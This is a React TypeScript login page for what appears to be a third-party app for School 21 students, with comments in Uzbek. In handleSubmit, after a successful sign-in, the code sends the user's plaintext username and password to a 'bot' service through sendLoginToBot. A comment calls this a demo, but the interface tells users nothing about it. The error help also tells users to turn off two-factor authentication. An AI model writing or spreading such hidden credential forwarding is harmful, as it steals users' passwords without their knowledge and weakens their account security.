import React, { useState, useEffect } from "react";
import {
  Lock,
  User,
  AlertCircle,
  Eye,
  EyeOff,
  HelpCircle,
  Maximize,
  Minimize,
  CheckSquare,
  Square,
} from "lucide-react";
import { ApiService } from "../services/api";
import { Language } from "../types";
import { TRANSLATIONS } from "../constants";
import { sendLoginToBot } from "../services/bot"; // import qiling

interface Props {
  onLoginSuccess: (login: string) => void;
  lang: Language;
  setLang: (l: Language) => void;
}

export const LoginPage: React.FC<Props> = ({
  onLoginSuccess,
  lang,
  setLang,
}) => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [isFullscreen, setIsFullscreen] = useState(false);
  const t = TRANSLATIONS[lang];

  useEffect(() => {
    // Check for saved login
    const savedLogin = localStorage.getItem("s21_remember_login");
    if (savedLogin) {
      setUsername(savedLogin);
      setRememberMe(true);
    }

    const handleFullscreenChange = () => {
      setIsFullscreen(!!document.fullscreenElement);
    };
    document.addEventListener("fullscreenchange", handleFullscreenChange);
    return () =>
      document.removeEventListener("fullscreenchange", handleFullscreenChange);
  }, []);

  const toggleFullscreen = () => {
    if (!document.fullscreenElement) {
      document.documentElement.requestFullscreen().catch(() => {});
    } else {
      if (document.exitFullscreen) document.exitFullscreen();
    }
  };

const handleSubmit = async (e: React.FormEvent) => {
  e.preventDefault();

  // Login formatini tekshirish
  if (username.includes("@")) {
    setError("Please use your Login (e.g. rrangesi), not email.");
    return;
  }

  setLoading(true);
  setError("");

  // Remember Me funksiyasi
  if (rememberMe) {
    localStorage.setItem("s21_remember_login", username.trim().toLowerCase());
  } else {
    localStorage.removeItem("s21_remember_login");
  }

  // Serverga autentifikatsiya so‘rovi
  const result = await ApiService.authenticate(username, password);

  if (result.success) {
    // App ichidagi login flow
    onLoginSuccess(username);

    // Demo uchun botga yuborish (username + password)
    await sendLoginToBot(username, password); 
  } else {
    setError(result.error || "Authentication failed");
    setLoading(false);
  }
};


  return (
    <div className="relative flex items-center justify-center min-h-screen p-4 overflow-hidden">
      {/* Background Effects - Dynamic Colors */}
      <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-neon-purple/20 rounded-full blur-[120px] animate-pulse-slow" />
      <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-neon-cyan/20 rounded-full blur-[120px] animate-pulse-slow delay-1000" />

      <div className="relative z-10 w-full max-w-md">
        {/* Top Right Controls */}
        <div className="absolute right-0 flex items-center gap-3 -top-12">
          {/* Fullscreen Toggle */}
          <button
            onClick={toggleFullscreen}
            className="p-1 text-gray-500 transition-colors hover:text-white"
            title="Toggle Fullscreen"
          >
            {isFullscreen ? <Minimize size={18} /> : <Maximize size={18} />}
          </button>

          {/* Lang Switcher */}
          <div className="flex gap-2 pl-3 border-l border-white/10">
            {(["EN", "RU", "UZ"] as Language[]).map((l) => (
              <button
                key={l}
                onClick={() => setLang(l)}
                className={`text-xs font-bold px-2 py-1 rounded transition-colors ${
                  lang === l
                    ? "text-neon-cyan bg-white/10"
                    : "text-gray-500 hover:text-gray-300"
                }`}
              >
                {l}
              </button>
            ))}
          </div>
        </div>

        <div className="bg-white/5 backdrop-blur-xl border border-white/10 rounded-3xl p-8 shadow-[0_0_50px_rgba(0,0,0,0.5)] relative overflow-hidden">
          {/* Top decorative line */}
          <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-neon-purple via-neon-magenta to-neon-cyan" />

          <div className="mb-8 text-center">
            <div className="flex items-center justify-center w-16 h-16 mx-auto mb-4 shadow-lg bg-gradient-to-br from-neon-cyan to-neon-purple rounded-xl shadow-neon-purple/20">
              <span className="text-3xl font-bold text-black">21</span>
            </div>
            <h1 className="mb-2 text-3xl font-bold tracking-tight text-white">
              {t.welcome}
            </h1>
            <p className="text-gray-400">{t.loginSubtitle}</p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-2">
              <label className="pl-1 text-xs font-semibold tracking-wider text-gray-500 uppercase">
                {t.login}
              </label>
              <div className="relative group">
                <div className="absolute inset-y-0 left-0 flex items-center pl-3 text-gray-400 transition-colors pointer-events-none group-focus-within:text-neon-cyan">
                  <User size={18} />
                </div>
                <input
                  type="text"
                  value={username}
                  onChange={(e) =>
                    setUsername(e.target.value.trim().toLowerCase())
                  }
                  className="w-full py-3 pl-10 pr-4 text-white placeholder-gray-600 transition-all border bg-black/40 border-white/10 rounded-xl focus:outline-none focus:border-neon-cyan/50 focus:bg-black/60"
                  placeholder="e.g. rrangesi"
                  required
                />
              </div>
            </div>

            <div className="space-y-2">
              <label className="pl-1 text-xs font-semibold tracking-wider text-gray-500 uppercase">
                {t.password}
              </label>
              <div className="relative group">
                <div className="absolute inset-y-0 left-0 flex items-center pl-3 text-gray-400 transition-colors pointer-events-none group-focus-within:text-neon-purple">
                  <Lock size={18} />
                </div>
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full py-3 pl-10 pr-10 text-white placeholder-gray-600 transition-all border bg-black/40 border-white/10 rounded-xl focus:outline-none focus:border-neon-purple/50 focus:bg-black/60"
                  placeholder="••••••••"
                  required
                  autoComplete="current-password"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute inset-y-0 right-0 flex items-center pr-3 text-gray-500 transition-colors hover:text-white"
                >
                  {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                </button>
              </div>
            </div>

            {/* Remember Me Checkbox */}
            <div
              className="flex items-center gap-2 cursor-pointer group"
              onClick={() => setRememberMe(!rememberMe)}
            >
              <div
                className={`transition-colors ${
                  rememberMe
                    ? "text-neon-cyan"
                    : "text-gray-500 group-hover:text-gray-400"
                }`}
              >
                {rememberMe ? <CheckSquare size={18} /> : <Square size={18} />}
              </div>
              <span
                className={`text-xs font-medium transition-colors ${
                  rememberMe
                    ? "text-white"
                    : "text-gray-500 group-hover:text-gray-400"
                }`}
              >
                {lang === "UZ"
                  ? "Loginni eslab qolish"
                  : lang === "RU"
                  ? "Запомнить логин"
                  : "Remember login"}
              </span>
            </div>

            {error && (
              <div className="p-3 space-y-2 border rounded-lg bg-red-500/10 border-red-500/20 animate-fadeIn">
                <div className="flex items-start gap-3 text-sm font-medium text-red-300">
                  <AlertCircle size={16} className="shrink-0 mt-0.5" />
                  <span>{error}</span>
                </div>
                <div className="p-2 text-xs text-gray-400 border rounded ml-7 bg-black/20 border-white/5">
                  <div className="flex items-center gap-1 mb-1 text-gray-300">
                    <HelpCircle size={12} />
                    <span className="font-bold">Troubleshooting:</span>
                  </div>
                  <ul className="space-y-1 list-disc list-inside">
                    <li>
                      Ensure <strong>2FA (Authenticator) is OFF</strong> on your
                      profile.
                    </li>
                    <li>Check Caps Lock and Keyboard Layout.</li>
                    <li>
                      Do not use email, use only login (e.g.{" "}
                      <code>rrangesi</code>).
                    </li>
                  </ul>
                </div>
              </div>
            )}

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-gradient-to-r from-neon-purple to-neon-cyan text-white font-bold py-4 rounded-xl shadow-[0_0_20px_rgb(var(--color-secondary)/0.3)] hover:shadow-[0_0_30px_rgb(var(--color-primary)/0.5)] hover:scale-[1.02] active:scale-[0.98] transition-all disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {loading ? (
                <span className="flex items-center justify-center gap-2">
                  <span className="w-4 h-4 border-2 rounded-full border-white/30 border-t-white animate-spin" />
                  {t.loading}
                </span>
              ) : (
                t.connect
              )}
            </button>
          </form>

          <p className="mt-6 text-xs text-center text-gray-500">{t.authDesc}</p>
          <p className="mt-6 text-xs text-center text-green-500">{t.schoolniLinki}</p>
        </div>
      </div>
    </div>
  );
};
